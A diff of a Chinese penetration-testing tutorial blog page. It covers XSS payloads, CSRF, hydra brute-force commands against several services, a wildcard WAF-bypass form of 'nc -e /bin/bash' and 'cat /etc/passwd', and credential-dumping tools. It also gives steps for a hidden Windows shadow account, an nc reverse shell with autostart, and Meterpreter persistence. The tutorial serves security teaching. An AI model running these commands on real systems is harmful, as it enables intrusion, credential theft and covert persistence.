+ <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;<span class="selector-tag">text</span>/css&quot;&gt;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">$&#123;xss&#125;</span>);&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>($&#123;xss&#125;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">在CSS中输出同样存在XSS的风险，如：</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>);&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>(<span class="built_in">alert</span>(/xss/));&#125;</span><br></pre></td></tr></table></figure></li>
 <li><p>在地址中输出<br> 6.1 在URL的path（路径）或者search（参数）中输出</p>
  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.evil.com/?test=$var&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.evil.com/?test=&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&quot;&quot; &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p> 防御方法：使用URLEncode</p>
@@ -1589,7 +1573,7 @@ function showBtn(){
 <li>只允许用户输入我们期望的数据，如年龄的textbox中只允许输入数字，其余过滤；</li>
 <li>对数据进行Html Encode处理，如&lt;转化为&amp;lt；、&amp;转化为&amp;amp；</li>
 <li>过滤或移除特殊的Html标签，如：script、iframe；</li>
-<li>过滤JavaScript事件的标签，如“onclick=”、“onfocus”等等。</li>
+<li>过滤JavaScript事件的标签，如“onclick&#x3D;”、“onfocus”等等。</li>
 </ul>
 </li>
 <li><p>上传漏洞</p>
@@ -1603,11 +1587,11 @@ function showBtn(){
 <p>  逻辑漏洞包括任意重置用户密码，修改订单等等，这类漏洞是扫描器所不能扫描出来的，所以需要我们认真分析整个站点的功能，分析其逻辑，多用burpsuite抓包观察数据包是否可篡改，验证码是否可爆破等等</p>
 </li>
 <li><p>csrf</p>
-<p>  <strong>定义</strong>：是指攻击者通过伪装来自受信任用户的请求来利用受信任的站点，强制对已完成认证的用户进行非预期的个人信息或设定信息等某种状态更新，也就是说攻击者盗用了你的身份，以你的名义发送恶意请求。<br><br>  攻击者迫使web应用的用户去执行攻击者预设的操作，如果服务器没有合适的防御措施，用户即使访问熟悉的可信网站（生成的poc可以隐藏到论坛/blog等用户生成内容的网站中）也有受到攻击的危险</p>
+<p>  <strong>定义</strong>：是指攻击者通过伪装来自受信任用户的请求来利用受信任的站点，强制对已完成认证的用户进行非预期的个人信息或设定信息等某种状态更新，也就是说攻击者盗用了你的身份，以你的名义发送恶意请求。<br><br>  攻击者迫使web应用的用户去执行攻击者预设的操作，如果服务器没有合适的防御措施，用户即使访问熟悉的可信网站（生成的poc可以隐藏到论坛&#x2F;blog等用户生成内容的网站中）也有受到攻击的危险</p>
 <p>  攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
 <p>  因此对于用户来说很难避免在登陆一个网站之后不点击一些链接进行其他操作，所以随时可能成为CSRF的受害者。</p>
 <p>  检测csrf漏洞一般是看每一个操作是否有验证码验证，是否有token或者referer,可以注册多个账户然后利用A用户生成的poc去检测B用户，poc可以通过burpsuite去生成<br></p>
-<p>  <strong>功能使用的是请求/响应模式</strong></p>
+<p>  <strong>功能使用的是请求&#x2F;响应模式</strong></p>
 <p>  如何防止CSRF跨站请求攻击：<br></p>
 <ul>
 <li><p>在web站点，将持久化的授权（例如cookie或者http授权）切换为瞬时的授权方法（在每个form中提供隐藏field）；</p>
@@ -1625,8 +1609,6 @@ function showBtn(){
 </li>
 </ul>
 </li>
-</ul>
-<ul>
 <li><p>未授权访问</p>
 <p>  这里所指的未授权包括各种空密码之类的，这种漏洞危害是不言而喻的</p>
 </li>
@@ -1634,11 +1616,12 @@ function showBtn(){
 <p>  可以通过爆破的方式发现弱口令，web可以使用burpsuite，服务可以使用hydra</p>
 <p>  <strong>hydra简单使用</strong></p>
 <p>  项目地址：<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p>
-<p>  hydra可以运行在Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS</p>
-<p>  支持的协议包括：Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP</p>
-  <figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">R	从上次未完成的爆破文件[hydra.restore]中读取爆破进度并接着上次的进度继续往后爆破</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">S 	爆破https时需要加上该选项</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">s 	如果要爆破的服务用的不是默认端口,可以用这个来手工指定服务端口号</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">l/-L 	指定用户名 / 指定用户名字典文件</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">p/-P 	指定密码 / 指定密码字典文件[字典务必要自己精心准备,别人的始终不适合自己的环境]</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">e 	尝试空密码[n]/尝试将用户名作为密码[s]/尝试将用户名和密码位置调换爆破[r]</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">f/-F 	当爆出第一个正确的密码后,就自动退出程序,-f表示单个<span class="string">&#x27;进程&#x27;</span>退出,-F表示全局退出</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">t 	指定爆破进程,实际爆破中给<span class="number">8</span>个左右即可,太高了容易报警,速度慢不怕,就怕动静儿太大,这里只是个参考,如果目标内网环境相对比较松,可以适当再放大一点,当然,肯定不能    无限大,基于目标系统而定,大家酌情使用吧</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">w 	设定超时时长,默认<span class="number">32</span>秒,一般情况<span class="number">10</span>秒即可</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby"><span class="number">4</span>/-<span class="number">6</span> 	<span class="number">4</span>表示用ipv4,<span class="number">6</span>表示用ipv6</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">v 	显示爆破信息</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">M 	把要爆破的目标都写到一个文件中,每行对应一个目标,支持域名,CIDR格式,或者单个ip的形式</span></span><br></pre></td></tr></table></figure>
+<p>  hydra可以运行在Linux, Windows&#x2F;Cygwin, Solaris, FreeBSD&#x2F;OpenBSD, QNX (Blackberry 10) and MacOS</p>
+<p>  支持的协议包括：Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP&#x2F;R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP</p>
+  <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-R	从上次未完成的爆破文件[hydra.restore]中读取爆破进度并接着上次的进度继续往后爆破</span></span><br><span class="line"><span class="deletion">-S 	爆破https时需要加上该选项</span></span><br><span class="line"><span class="deletion">-s 	如果要爆破的服务用的不是默认端口,可以用这个来手工指定服务端口号</span></span><br><span class="line"><span class="deletion">-l/-L 	指定用户名 / 指定用户名字典文件</span></span><br><span class="line"><span class="deletion">-p/-P 	指定密码 / 指定密码字典文件[字典务必要自己精心准备,别人的始终不适合自己的环境]</span></span><br><span class="line"><span class="deletion">-e 	尝试空密码[n]/尝试将用户名作为密码[s]/尝试将用户名和密码位置调换爆破[r]</span></span><br><span class="line"><span class="deletion">-f/-F 	当爆出第一个正确的密码后,就自动退出程序,-f表示单个&#x27;进程&#x27;退出,-F表示全局退出</span></span><br><span class="line"><span class="deletion">-t 	指定爆破进程,实际爆破中给8个左右即可,太高了容易报警,速度慢不怕,就怕动静儿太大,这里只是个参考,如果目标内网环境相对比较松,可以适当再放大一点,当然,肯定不能    无限大,基于目标系统而定,大家酌情使用吧</span></span><br><span class="line"><span class="deletion">-w 	设定超时时长,默认32秒,一般情况10秒即可</span></span><br><span class="line"><span class="deletion">-4/-6 	4表示用ipv4,6表示用ipv6</span></span><br><span class="line"><span class="deletion">-v 	显示爆破信息</span></span><br><span class="line"><span class="deletion">-M 	把要爆破的目标都写到一个文件中,每行对应一个目标,支持域名,CIDR格式,或者单个ip的形式</span></span><br></pre></td></tr></table></figure>
 <p>  针对各类服务的实例爆破演示</p>
-  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 mssql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 mysql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 smb:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 postgres:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 rdp:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 ssh:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 ftp:<span class="comment">//192.168.1.2</span></span></span><br></pre></td></tr></table></figure></li>
+  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 mssql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 mysql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 smb:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 postgres:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 rdp:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 ssh:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 ftp:<span class="comment">//192.168.1.2</span></span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>越权访问</p>
 <p>  越权访问又包括水平越权和垂直访问，这种漏洞我们可以观察url是否带有用户的明文信息或者直接访问一些敏感页面</p>
 </li>
@@ -1694,11 +1677,11 @@ function showBtn(){
 <li>过滤掉、；，[,],|,&lt;,&gt;,\之类的符号；</li>
 <li>设置用户的权限。</li>
 </ul>
-<p>  linux命令执行绕过过滤/waf技巧</p>
+<p>  linux命令执行绕过过滤&#x2F;waf技巧</p>
 <p>  主要利用了bash的通配符、连接符、未初始化的变量三个特性来绕过WAF规则</p>
 <ul>
 <li><p>通配符<br>  在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</p>
-  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*    代表『 <span class="selector-tag">0</span> 个到无穷多个』任意字符</span><br><span class="line">?    代表『一定有一个』任意字符</span><br><span class="line"><span class="selector-attr">[ ]</span>    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 <span class="selector-attr">[abcd]</span> 代表『一定有一个字符， 可能是 <span class="selector-tag">a</span>, <span class="selector-tag">b</span>, <span class="selector-tag">c</span>, <span class="selector-tag">d</span> 这四个任何一个』</span><br><span class="line"><span class="selector-attr">[ - ]</span>    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 <span class="selector-attr">[0-9]</span> 代表 <span class="selector-tag">0</span> 到 <span class="selector-tag">9</span> 之间的所有数字，因为数字的语系编码是连续的！</span><br><span class="line"><span class="selector-attr">[^ ]</span>    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 <span class="selector-attr">[^abc]</span> 代表 一定有一个字符，只要是非 <span class="selector-tag">a</span>, <span class="selector-tag">b</span>, <span class="selector-tag">c</span> 的其他字符就接受的意思。</span><br></pre></td></tr></table></figure>
+  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*    代表『 <span class="number">0</span> 个到无穷多个』任意字符</span><br><span class="line">?    代表『一定有一个』任意字符</span><br><span class="line"><span class="selector-attr">[ ]</span>    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 <span class="selector-attr">[abcd]</span> 代表『一定有一个字符， 可能是 <span class="selector-tag">a</span>, <span class="selector-tag">b</span>, c, d 这四个任何一个』</span><br><span class="line"><span class="selector-attr">[ - ]</span>    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 <span class="selector-attr">[0-9]</span> 代表 <span class="number">0</span> 到 <span class="number">9</span> 之间的所有数字，因为数字的语系编码是连续的！</span><br><span class="line"><span class="selector-attr">[^ ]</span>    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 <span class="selector-attr">[^abc]</span> 代表 一定有一个字符，只要是非 <span class="selector-tag">a</span>, <span class="selector-tag">b</span>, c 的其他字符就接受的意思。</span><br></pre></td></tr></table></figure>
 <p>  比如可以使用</p>
 <p>  <code>ls -l</code> 替换成<code>/?in/?s -l</code> <br><br>  <code>cat /etc/passwd</code> 替换成 <code>/?in/cat /?tc/p?sswd</code> <br><br>  <code>nc -e /bin/bash 127.0.0.1 3737</code> 替换成 <code>/??n/?c -e /??n/b??h 2130706433 3737</code></p>
 </li>
@@ -1714,8 +1697,6 @@ function showBtn(){
 <li><p>SSRF</p>
 <p>  SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
 </li>
-</ul>
-<ul>
 <li><p>参数</p>
 <p>  参数超长是否导致溢出、参数有特殊字符是否会导致程序报错、参数确实是否导致程序报错</p>
 </li>
@@ -1815,9 +1796,9 @@ function showBtn(){
 <ul>
 <li><p>系统漏洞提权</p>
 <ul>
-<li><strong>Windows平台：</strong> 可以通过systeminfo查看系统版本和补丁记录，或使用提权辅助工具<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>，参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">SecWiki/windows-kernel-exploits</a></li>
-<li><strong>Linux平台:</strong> uname -a 查看系统内核版本，如脏牛漏洞，参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">SecWiki/linux-kernel-exploits</a></li>
-<li><strong>MacOS平台:</strong> 参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/macos-kernel-exploits">SecWiki/macos-kernel-exploits</a></li>
+<li><strong>Windows平台：</strong> 可以通过systeminfo查看系统版本和补丁记录，或使用提权辅助工具<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>，参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">SecWiki&#x2F;windows-kernel-exploits</a></li>
+<li><strong>Linux平台:</strong> uname -a 查看系统内核版本，如脏牛漏洞，参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">SecWiki&#x2F;linux-kernel-exploits</a></li>
+<li><strong>MacOS平台:</strong> 参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/macos-kernel-exploits">SecWiki&#x2F;macos-kernel-exploits</a></li>
 </ul>
 </li>
 <li><p>数据库提权</p>
@@ -1833,7 +1814,7 @@ function showBtn(){
 <p>  在windows下可以使用BeRoot工具进行系统配置检查，利用配置错误点进行提权。 </p>
 </li>
 <li><p>获取或嗅探高权限账号提权</p>
-<p>  利用LaZagne project（支持linux、windows、mac），可以抓取chats、mails、database、wifi、sysadmin、wallet、browsers、memory中的密码，可以利用抓取到的密码进行高权限帐号密码测试，也可以利用神器mimikatz和mimipenguin，不过在部分时候由于权限问题可能读取不到部分密码。 </p>
+<p>  利用LaZagne project（支持linux、windows、mac），可以抓取chats、mails、database、wifi、sysadmin、wallet、browsers、memory中的密码，可以利用抓取到的密码进行高权限帐号密码测试，也可以利用神器mimikatz和mimipenguin，不过在部分时候由于权限问题可能读取不到部分密码。</p>
 </li>
 </ul>
 </li>
@@ -1846,7 +1827,7 @@ function showBtn(){
 </li>
 <li><p>账号维权，获取用户名密码，或自建隐藏账号 </p>
 <p>  Window 影子账号创建</p>
-  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>. 通过net user xxx$ <span class="number">123</span> /add </span><br><span class="line"><span class="attribute">2</span>. 打开注册表，找到HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/，双击Administrator记住类型下面的十六进制值<span class="number">0</span>x<span class="number">1</span>f<span class="number">4</span>找到左侧对应得文件夹即<span class="number">000001</span>F<span class="number">4</span>，双击打开复制里面F下的所有内容。 将内容复制到xxx$ 对应的文件夹下面，然后将xxx$ 和<span class="number">00000</span>XXX 导出注册表</span><br><span class="line"><span class="attribute">3</span>. 接着删除xxx$ 用户 net user xxx$ /del</span><br><span class="line"><span class="attribute">4</span>. 双击导入刚才导出的两个注册表</span><br></pre></td></tr></table></figure></li>
+  <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 通过net <span class="keyword">user</span> <span class="title">xxx</span>$ <span class="number">123</span> /add </span><br><span class="line"><span class="number">2</span>. 打开注册表，找到HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/，双击Administrator记住类型下面的十六进制值<span class="number">0</span>x1f4找到左侧对应得文件夹即<span class="number">000001</span>F4，双击打开复制里面F下的所有内容。 将内容复制到xxx$ 对应的文件夹下面，然后将xxx$ 和<span class="number">00000</span>XXX 导出注册表</span><br><span class="line"><span class="number">3</span>. 接着删除xxx$ 用户 net <span class="keyword">user</span> <span class="title">xxx</span>$ /del</span><br><span class="line"><span class="number">4</span>. 双击导入刚才导出的两个注册表</span><br></pre></td></tr></table></figure></li>
 <li><p>常用的远程控制软件</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework">msf</a> </li>
@@ -1862,9 +1843,9 @@ function showBtn(){
 <li><a target="_blank" rel="noopener" href="https://github.com/quasar/QuasarRAT">Quasar</a></li>
 </ul>
 <p>  nc</p>
-  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器监听<span class="number">4444</span>端口 nc -lvvp <span class="number">4444</span></span><br><span class="line"></span><br><span class="line">目标执行 nc -t -e cmd.exe <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span> <span class="number">4444</span> ，并添加开机启动</span><br></pre></td></tr></table></figure>
-<p>  msf</p>
-  <figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">先获得一个Meterpretershell</span><br><span class="line">利用 Persistence模块</span><br><span class="line"><span class="keyword">run </span>persistence -U -i 10 -p 4444 -r <span class="meta">x</span>.<span class="meta">x</span>.<span class="meta">x</span>.<span class="meta">x</span></span><br><span class="line"></span><br><span class="line">    -U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；</span><br><span class="line">    -i：设置反向连接间隔时间，单位为秒；</span><br><span class="line">    -p：设置反向连接的端口号；</span><br><span class="line">    -r：设置反向连接的ip地址。</span><br><span class="line"></span><br><span class="line">Metsvc 模块</span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">run </span>metsvc -A</span><br><span class="line">直接在目标主机上开启一个服务</span><br><span class="line">利用handler下的windows/metsvc_bind_tcp模块，重新获得shell</span><br></pre></td></tr></table></figure></li>
+  <figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器监听<span class="number">4444</span>端口 nc -lvvp <span class="number">4444</span></span><br><span class="line"></span><br><span class="line">目标执行 nc -t -e cmd.exe <span class="variable language_">x</span>.<span class="variable language_">x</span>.<span class="variable language_">x</span>.<span class="variable language_">x</span> <span class="number">4444</span> ，并添加开机启动</span><br></pre></td></tr></table></figure>
+<p>  msf<br>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">先获得一个Meterpretershell</span><br><span class="line">利用 Persistence模块</span><br><span class="line">run persistence -U -<span class="selector-tag">i</span> <span class="number">10</span> -<span class="selector-tag">p</span> <span class="number">4444</span> -<span class="attribute">r</span> <span class="attribute">x</span><span class="selector-class">.x</span><span class="selector-class">.x</span><span class="selector-class">.x</span></span><br><span class="line"></span><br><span class="line">    -U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；</span><br><span class="line">    -<span class="selector-tag">i</span>：设置反向连接间隔时间，单位为秒；</span><br><span class="line">    -<span class="selector-tag">p</span>：设置反向连接的端口号；</span><br><span class="line">    -<span class="attribute">r</span>：设置反向连接的ip地址。</span><br><span class="line"></span><br><span class="line">Metsvc 模块</span><br><span class="line"></span><br><span class="line">run metsvc -<span class="selector-tag">A</span></span><br><span class="line">直接在目标主机上开启一个服务</span><br><span class="line">利用handler下的windows/metsvc_bind_tcp模块，重新获得shell</span><br></pre></td></tr></table></figure></p>
+</li>
 </ul>
 </li>
 <li><p>内网渗透</p>
@@ -1891,19 +1872,15 @@ function showBtn(){
 <li>可以对原始系统生成镜像环境，然后对镜像环境进行测试</li>
 <li>明确渗透测试范围</li>
 </ol>
+<p> <a href="http://www.pa55w0rd.online/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">http://www.pa55w0rd.online/渗透测试/</a> </p>
 -->
       
 
     </div>
 
-
-    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-
-
     <footer class="article-footer">
       
-        <a data-url="http://www.pa55w0rd.online/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ckxh6t4tt0084dgswdqh60pdk" class="article-share-link" data-share="baidu" data-title="渗透测试流程">分享到</a>
+        <a data-url="http://www.pa55w0rd.online/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="cmn8a4dk3008s6ohocyd7hl6y" class="article-share-link" data-share="baidu" data-title="渗透测试流程">分享到</a>
       
 
       
@@ -1914,6 +1891,19 @@ function showBtn(){
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
 
 
+
+      
+      
+      <div class="post-copyright post-copyright--butterfly" role="note">
+        
+        <p><span class="post-copyright__label">文章作者：</span><span class="post-copyright__val">Pa55w0rd</span></p>
+        <p><span class="post-copyright__label">文章链接：</span><a class="post-copyright__link" href="http://www.pa55w0rd.online/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="bookmark">http://www.pa55w0rd.online/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</a></p>
+        
+        <p class="post-copyright__license"><span class="post-copyright__label">版权声明：</span><span class="post-copyright__lic">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener noreferrer">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 Pa55w0rd！</span></p>
+        
+        
+      </div>
+      
     </footer>
   </div>
   
@@ -1972,23 +1962,23 @@ function showBtn(){
       <ul>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/wechatmp-chatgpt/">在微信公众号中接入ChatGPT（支持GPT-4)</a>
+            <a id="recentpost_item" href="/codescan-00/">CodeScan 实战（00）：从一次代码审计需求，到一套可追溯的工程实践</a>
           </li>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/jumpserver-yida/">通过宜搭流程表单完成JumpServer自动化授权</a>
+            <a id="recentpost_item" href="/codescan-01/">CodeScan 实战（01）：用 Docker Compose 部署，与原 Artex 共存</a>
           </li>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/jumpserver/">JumpServer堡垒机部署与运营</a>
+            <a id="recentpost_item" href="/codescan-02/">CodeScan 实战（02）：吸收其他项目的优势，统一威胁、漏洞与证据</a>
           </li>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/jetbrains-use/">jetbrains产品免费食用方法-_-</a>
+            <a id="recentpost_item" href="/codescan-03/">CodeScan 实战（03）：补齐审计覆盖、反证和收官门禁</a>
           </li>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/zer-trust-security-model/">SPA &amp; fwknop &amp; SDP &amp; Pomerium &amp; IAP &amp; Traefik &amp; KeyCloak &amp; Casbin &amp; ORY Oathkeeper</a>
+            <a id="recentpost_item" href="/codescan-04/">CodeScan 实战（04）：把威胁建模接进真正的任务生命周期</a>
           </li>
         
       </ul>
@@ -2001,7 +1991,7 @@ function showBtn(){
